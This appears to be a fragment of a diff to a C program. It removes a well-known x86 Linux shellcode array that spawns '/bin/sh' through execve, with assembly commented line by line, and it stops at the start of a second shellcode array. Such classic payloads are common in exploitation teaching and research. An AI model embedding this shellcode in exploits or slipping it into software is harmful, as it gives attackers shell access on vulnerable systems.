@@ -25,24 +25,6 @@
 
 int main(int argc, char** argv)
 {
-	char shellcode1[]=
-		"\xeb\x1f"                      /* jmp 0x1f              */
-		"\x5e"                          /* popl %esi             */
-		"\x89\x76\x08"                  /* movl %esi,0x8(%esi)   */
-		"\x31\xc0"                      /* xorl %eax,%eax        */
-		"\x88\x46\x07"                  /* movb %eax,0x7(%esi)   */
-		"\x89\x46\x0c"                  /* movl %eax,0xc(%esi)   */
-		"\xb0\x0b"                      /* movb $0xb,%al         */
-		"\x89\xf3"                      /* movl %esi,%ebx        */
-		"\x8d\x4e\x08"                  /* leal 0x8(%esi),%ecx   */
-		"\x8d\x56\x0c"                  /* leal 0xc(%esi),%edx   */
-		"\xcd\x80"                      /* int $0x80             */
-		"\x31\xdb"                      /* xorl %ebx,%ebx        */
-		"\x89\xd8"                      /* movl %ebx,%eax        */
-		"\x40"                          /* inc %eax              */
-		"\xcd\x80"                      /* int $0x80             */
-		"\xe8\xdc\xff\xff\xff"          /* call -0x24            */
-		"/bin/sh";                      /* .string \"/bin/sh\"   */
 
 char shellcode[] =
 	"\xeb\x39\x5e\x31"
